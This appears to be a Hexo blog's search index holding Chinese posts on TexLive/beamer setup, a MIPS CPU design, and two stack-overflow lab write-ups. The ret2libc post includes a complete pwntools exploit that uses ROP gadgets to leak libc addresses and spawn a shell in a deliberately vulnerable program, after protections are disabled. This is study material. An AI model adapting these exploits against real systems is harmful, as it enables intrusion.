@@ -1,0 +1,990 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/02/07/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ubuntu搭建TexLive环境写slide</title>
+    <url>/2018/05/08/ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>想做ppt，但几次ppt演示时出现兼容问题，于是想尝试格式稳定的<code>beamer</code> 做<code>ppt</code> 。</li>
+<li>本机空间不足，<code>apt-get install</code> 命令无法指定安装路径，于是挂载了一个硬盘，手动下载后安装，空间充足可<code>sudo apt install texlive-full texstudio</code> 一行命令解决。</li>
+</ul>
+<h3 id="texlive安装"><a href="#texlive安装" class="headerlink" title="texlive安装"></a>texlive安装</h3><ol>
+<li>进入准备安装路径，使用更快的清华大学镜像源下载<code>texlive</code> 安装包：</li>
+</ol>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd &#x2F;media&#x2F;xsyin&#x2F;extra</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;CTAN&#x2F;systems&#x2F;texlive&#x2F;Images&#x2F;texlive2018.iso</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>单击挂载光盘，用浏览器打开主目录下的<code>index.html</code> ，找到<code>tex Live安装指南</code> ，或阅读<a href="http://tug.org/texlive/doc/texlive-zh-cn/texlive-zh-cn.pdf" target="_blank" rel="noopener">网络版TEX Live安装指南</a> 。使用图形化安装，安装依赖：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt install perl-tk</span><br><span class="line">$ .&#x2F;install-tl -gui&#x3D;perltk</span><br></pre></td></tr></table></figure>
+
+<p><img src="ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/install-lnx-main.png" alt="install-lnx-main"></p>
+<p><code>Installation collections --&gt; change</code> 选择安装模块，去除一些用不着的语言<code>Cyrillic</code> 至<code>Spanish</code> ，选上<code>US and UK English</code> ：</p>
+<p><img src="ubuntu%E6%90%AD%E5%BB%BATexLive%E7%8E%AF%E5%A2%83%E5%86%99slide/stdcoll.png" alt="stdcoll"></p>
+<p><code>TEXDIR --&gt;change</code> 修改为安装路径：<code>/media/xsyin/extra/texlive2018</code> ，其余默认，开始安装。</p>
+<ol start="3">
+<li>配置环境变量，编辑<code>~/.bashrc</code>， 添加：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;media&#x2F;xsyin&#x2F;extra&#x2F;texlive2018&#x2F;bin&#x2F;x86_64-linux</span><br><span class="line">export MANPATH&#x3D;&#x2F;media&#x2F;xsyin&#x2F;extra&#x2F;texlive2018&#x2F;texmf-dist&#x2F;doc&#x2F;man:$MANPATH</span><br><span class="line">export INFOPATH&#x3D;&#x2F;media&#x2F;xsyin&#x2F;extra&#x2F;texlive2018&#x2F;texmf-dist&#x2F;doc&#x2F;info:$INFOPATH</span><br></pre></td></tr></table></figure>
+
+<p><code>source ~/.bashrc</code> 启用配置。</p>
+<ol start="4">
+<li>管理你的安装<code>tlmgr</code> ，设置清华大学开源仓库并更新，已安装<code>beamer</code>：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tlmgr option repository https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;CTAN&#x2F;systems&#x2F;texlive&#x2F;tlnet</span><br><span class="line">$ tlmgr update -all</span><br><span class="line">$ tlmgr info beamer</span><br></pre></td></tr></table></figure>
+
+<p>也可以<code>GUI</code> 模式启动： <code>tlmgr -gui</code></p>
+<ol start="5">
+<li>测试安装是否成功：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tex --version</span><br><span class="line">$ latex sample2e.tex</span><br><span class="line">$ pdflatex sample2e.tex</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="texstudio安装"><a href="#texstudio安装" class="headerlink" title="texstudio安装"></a>texstudio安装</h3><ul>
+<li>texstudio 占用空间不大，使用<code>sudo apt install texstusio</code> 安装或在<a href="http://texstudio.sourceforge.net/" target="_blank" rel="noopener">源码包下载页面</a> 选择对应的安装包，依赖不满足使用<code>sudo apt -f install</code> 安装。</li>
+<li><code>texstudio</code> 打开，配置语言为中文.</li>
+</ul>
+<h3 id="beamer"><a href="#beamer" class="headerlink" title="beamer"></a>beamer</h3><ul>
+<li>快速上手一般采用现成的模板，在texstudio中新建，复制以下最小模板，构建并查看：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!TEX program &#x3D; xelatex</span><br><span class="line"></span><br><span class="line">\documentclass&#123;beamer&#125;</span><br><span class="line">\usepackage&#123;xeCJK&#125;</span><br><span class="line"></span><br><span class="line">\usetheme&#123;Madrid&#125;</span><br><span class="line"></span><br><span class="line">\title[标题]&#123;完整标题&#125;</span><br><span class="line">\author[作者]&#123;完整作者&#125;</span><br><span class="line">\institute[单位]&#123;完整单位列表&#125;</span><br><span class="line">\date[日期]&#123;完整日期&#125;</span><br><span class="line"></span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line"></span><br><span class="line">%------------------------------------------------</span><br><span class="line"></span><br><span class="line">\begin&#123;frame&#125;</span><br><span class="line">    \titlepage</span><br><span class="line">\end&#123;frame&#125;</span><br><span class="line"></span><br><span class="line">%------------------------------------------------</span><br><span class="line"></span><br><span class="line">\begin&#123;frame&#125;&#123;Outline&#125;</span><br><span class="line">    \tableofcontents</span><br><span class="line">\end&#123;frame&#125;</span><br><span class="line"></span><br><span class="line">%------------------------------------------------</span><br><span class="line"></span><br><span class="line">\section&#123;背景介绍&#125;</span><br><span class="line"></span><br><span class="line">\begin&#123;frame&#125;</span><br><span class="line">\frametitle&#123;中文&#125;</span><br><span class="line"></span><br><span class="line">\begin&#123;block&#125;&#123;模块&#125;</span><br><span class="line">内容</span><br><span class="line">	\begin&#123;itemize&#125;</span><br><span class="line">	    \item 条目1</span><br><span class="line">	\end&#123;itemize&#125;</span><br><span class="line">\end&#123;block&#125;</span><br><span class="line"></span><br><span class="line">\end&#123;frame&#125;</span><br><span class="line"></span><br><span class="line">%------------------------------------------------</span><br><span class="line"></span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好了，现在可以开(ku) 心(bi)的写<code>slide</code> 了。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://zhenruichen.com/2015/09/02/Beamer-Chinese.html" target="_blank" rel="noopener">Beamer 显示中文的模板</a></p>
+]]></content>
+      <categories>
+        <category>tex</category>
+      </categories>
+      <tags>
+        <tag>tex</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈溢出</title>
+    <url>/2018/05/06/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<blockquote>
+<p>基于64位ubuntu 16.04操作系统版本以及gcc,gdb版本如下：</p>
+<p>Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</p>
+<p>GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</p>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<p>###准备工作 </p>
+<p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+<ul>
+<li>关闭<code>ASLR</code>(地址空间布局随机化): </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 |sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Cannary</code>:开启<code>Cannary</code>之后，函数开始时在rbp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用<code>__stackchk_fail</code>函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</li>
+<li><code>NX</code>:开启NX保护后，程序的堆栈将会不可执行，对应GCC编译选项<code>-z execstack</code>解除该保护。</li>
+</ul>
+<p>C语言栈帧结构如下：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/c.jpg" alt="c"></p>
+<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">FILE* g_fp; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> v,length=<span class="number">0</span>;           </span><br><span class="line">    g_fp=fopen(<span class="string">"../input/buffer_overflow_code_injection_write_file.txt"</span>,<span class="string">"r"</span>); </span><br><span class="line">    <span class="keyword">if</span>(g_fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open file failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(g_fp, <span class="string">"\\x%02x"</span>, &amp;v) == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[length++] = v;</span><br><span class="line">    &#125; </span><br><span class="line">    fclose(g_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    read_file(); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>分析漏洞代码， while循环出现栈溢出，读入文件中覆盖了rbp与返回地址，且修改其指向shellcode起始指令；</li>
+<li>分析读入文件，即将返回地址处修改为shellcode首地址</li>
+</ul>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_037.png" alt="选区_037"></p>
+<ul>
+<li>编译：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -g -z execstack -fno-stack-protector buffer_overflow_code_injection_write_file.c -o buffer_overflow</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
+<li>使用gdb调试运行：<code>gdb buffer_overflow</code></li>
+</ul>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_038.png" alt="选区_038"></p>
+<p>​       由调试可知栈帧结构如图所示，因此栈溢出时会覆盖<code>length</code>值，即100后有覆盖为97,最终读入0x6d即109，刚好从rbp指向地址开始填充之后的8个0x61，之后填充返回地址，由图中分析可知该返回地址应改为<code>0x00007fffffffdab0</code>，小端模式，读入文件中\x20\x18改为\xb0\xda。重新调试：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_039.png" alt="选区_039"></p>
+<p>成功跳入shellcode，继续运行：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_040.png" alt="选区_040"></p>
+<p>正常退出，此时output文件夹已生成新文件：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_041.png" alt="选区_041"></p>
+<p>在gdb调试环境下运行成功，但实际运行却出现段错误：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_042.png" alt="选区_042"></p>
+<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>​        经搜索查阅资料得知是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
+<p> 要获取shellcode首条指令的地址，可以在程序中打印出length的地址加上4(length)+8(rbp)+8(返回地址)=20,也可以利用内核转储获取真实地址。</p>
+<p> 首先启用内核转储：ulimit -c unlimited，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_045.png" alt="选区_045"></p>
+<p>由图中可知应把读入文件返回地址处改为：<code>\x40\xdb\xff\xff\xff\x7f\x00\x00</code>，再次运行：</p>
+<p><img src="%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_046.png" alt="选区_046"></p>
+<p>正常环境下运行成功。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>复现关键点：</p>
+<ul>
+<li>关闭保护措施</li>
+<li>找准rbp后保存返回地址的8个字节</li>
+<li>确定shellcode的入口地址</li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>栈溢出</tag>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>高级栈溢出及ret2libc</title>
+    <url>/2018/05/05/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/</url>
+    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><blockquote>
+<p>实验环境：uname -a    64位 ubuntu 16.04</p>
+<p>Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>
+</blockquote>
+<ul>
+<li>gdb-peda</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">$ echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot; &gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pwntools</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install pwn</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="三种保护机制"><a href="#三种保护机制" class="headerlink" title="三种保护机制"></a>三种保护机制</h3><ul>
+<li><strong>ASLR</strong> ：地址空间随机化，每次运行函数地址改变。</li>
+</ul>
+<p>​        绕过：随机化只是将每次库函数加载地址随机，库函数间相对地址不变，因此通过GOT来泄漏库函数地址，  以推导出libc中其他函数（如system）的地址。</p>
+<ul>
+<li><strong>NX</strong> ：通过在页表上设置NX(不可执行）位，将非代码段的地址空间设置成不可执行属性，一旦系统从这些地址空间进行取指令时，CPU就是报内存违例异常，进而杀死进程。栈空间也被操作系统设置了不可执行属性，因此普通的<code>shellode</code>注入无法执行。</li>
+</ul>
+<p>​        绕过：<code>ret2libc</code> 利用已有代码，更改返回地址时返回到系统函数。</p>
+<ul>
+<li><strong>Cannary</strong>  ： 通过在缓冲区和返回地址间插入一个<code>canary word</code> ，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</li>
+</ul>
+<p>​       暂时未研究如何绕过，因此使用<code>-fno-stack-protector</code> 标志关闭该安全保护机制。        </p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><strong>难点：</strong> </p>
+<ol>
+<li>由于ASLR机制，需要泄漏库函数地址以确定<code>system</code> 函数地址，本次结合<code>ROP</code> 使用<code>write</code> 函数获取<code>write</code> 函数实际地址。</li>
+<li>由于操作环境为64位<code>linux</code> ，函数通过<code>rdi,rsi,rdx,rcx,r8,r9</code> 以及栈传参，因此采用<code>pop,ret</code> 片段装填参数</li>
+</ol>
+<p>​    本次实验结合了<code>ret2libc</code> 与<code>ROP</code> 两种手段，为简化操作，内置了需要的<code>gadget</code> 。</p>
+<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: vuln.c</span></span><br><span class="line"><span class="comment">    &gt; Author: xsyin</span></span><br><span class="line"><span class="comment">    &gt; Mail: shouyinXu@163.com </span></span><br><span class="line"><span class="comment">    &gt; Created Time: 2018年05月05日 星期六 14时24分14秒</span></span><br><span class="line"><span class="comment">    &gt; Make: gcc -fno-stack-protector -g vuln.c -o vuln</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">helper</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"pop %rdi; pop %rsi; pop %rdx; ret"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Enter input: \n"</span>,<span class="number">14</span>);</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>read</code> 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。</p>
+<ul>
+<li>寻找溢出点</li>
+</ul>
+<p><img src="%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/%E9%80%89%E5%8C%BA_065.png" alt="选区_065"></p>
+<p><img src="%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/%E9%80%89%E5%8C%BA_066.png" alt="选区_066"></p>
+<p>溢出点在偏移136处，即<code>buf</code> 填充136之后为返回地址。</p>
+<ul>
+<li>寻找需要的<code>gadget</code> 片段</li>
+</ul>
+<p><img src="%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/%E9%80%89%E5%8C%BA_067.png" alt="选区_067"></p>
+<ul>
+<li>构造<code>payload</code> ：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload1 获取write函数实际地址</span><br><span class="line">payload1 &#x3D; &quot;A&quot; * 136  #截至返回地址前的缓冲区长度</span><br><span class="line">payload1 +&#x3D; p64(pppr) #跳转到PPPR指令序列，为write函数赋值</span><br><span class="line">payload1 +&#x3D; p64(0x1) #write函数的第一个参数，1表示输出到stdout</span><br><span class="line">payload1 +&#x3D; p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址</span><br><span class="line">payload1 +&#x3D; p64(0x8) #write函数的第三个参数，表示要输出字符串的长度</span><br><span class="line">payload1 +&#x3D; p64(plt_write) #调用write函数</span><br><span class="line">payload1 +&#x3D; p64(vuln)      #继续调用vuln函数</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>linux</code> 共享库的延迟绑定技术，函数第一次调用时填充<code>GOT</code>表，在运行到<code>read</code> 函数时<code>write</code> 函数<code>GOT</code> 表中已填入实际地址。<code>payload1</code> 读取该地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload2 跳转至库函数system</span><br><span class="line">payload2 &#x3D; &quot;A&quot; * 136   #截至返回地址前的缓冲区长度</span><br><span class="line">payload2 +&#x3D; p64(pr)   #跳转到PR指令序列，填充system的第一个参数</span><br><span class="line">payload2 +&#x3D; p64(binsh_addr)  #system函数的第一个参数&#x2F;bin&#x2F;sh</span><br><span class="line">payload2 +&#x3D; p64(systemAddr)    #调用system函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8Aret2libc/%E9%80%89%E5%8C%BA_068.png" alt="选区_068"></p>
+<p>退出报错，可以通过PPPR片段再次跳转到<code>exit</code> 函数正常退出。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <strong>优点：</strong>  通过<code>ret2libc</code> 与 <code>ROP</code> 绕过了ASLR与NX机制</p>
+<p><strong>缺点：</strong> </p>
+<ol>
+<li>未绕过GS机制，可通过更改<code>__stackchk_fail__</code>函数<code>GOT</code> 表项</li>
+</ol>
+<ol start="2">
+<li>内置了需要的<code>gadget</code> ，可使用通用的片段，ret2csu</li>
+<li>需要知道 <code>libc</code> 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索</li>
+</ol>
+<h3 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># file: exploit.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'vuln'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line"></span><br><span class="line">pppr = <span class="number">0x4005ba</span></span><br><span class="line">pr = <span class="number">0x400693</span></span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_system: "</span>+hex(libc_system)</span><br><span class="line"></span><br><span class="line">vuln = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload1 += p64(pppr)</span><br><span class="line">payload1 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload1 += p64(got_write)</span><br><span class="line">payload1 += p64(<span class="number">0x8</span>)</span><br><span class="line">payload1 += p64(plt_write)</span><br><span class="line">payload1 += p64(vuln)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter input:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"################ send payload1 ###########"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">writeAddrTmp = struct.unpack(<span class="string">'&lt;Q'</span>, p.recv(<span class="number">8</span>)[<span class="number">-8</span>::])</span><br><span class="line">writeAddr = writeAddrTmp[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"writeAddr:"</span>, hex(writeAddr)</span><br><span class="line"></span><br><span class="line">systemAddr = (writeAddr - libc_write) + libc_system</span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddr:"</span>, hex(systemAddr)</span><br><span class="line"></span><br><span class="line">binsh_addr = (writeAddr - libc_write) + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr:"</span>, hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload2 += p64(pr)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(systemAddr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter input:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"################ send payload2 ###########"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://jaq.alibaba.com/community/art/show?articleid=473" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>栈溢出</tag>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MIPS CPU单周期设计</title>
+    <url>/2018/05/03/MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/</url>
+    <content><![CDATA[<blockquote>
+<p>本设计为计算机系统结构实验，写此文仅为总结。</p>
+</blockquote>
+<hr>
+<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><ul>
+<li><p>安装Xilinx ISE Design Suite 14.7</p>
+</li>
+<li><p>本设计使用Verilog HDL硬件描述语言，需熟悉其基本语法。  </p>
+<a id="more"></a>
+
+</li>
+</ul>
+<h2 id="2-设计总体要求"><a href="#2-设计总体要求" class="headerlink" title="2.设计总体要求"></a>2.设计总体要求</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="(1)概述"></a>(1)概述</h3><p>单周期（Single Cycle）CPU是指CPU从取出1条指令到执行完该指令只需1个时钟周期。<br><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-3-1.png" alt=""><br>一条指令的执行过程包括：取指令→分析指令→执行指令→保存结果（如果有的话）。对于单周期CPU来说，这些执行步骤均在一个时钟周期内完成。</p>
+<h3 id="2-设计实现电路"><a href="#2-设计实现电路" class="headerlink" title="(2)设计实现电路"></a>(2)设计实现电路</h3><p><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/cpu.png" alt=""></p>
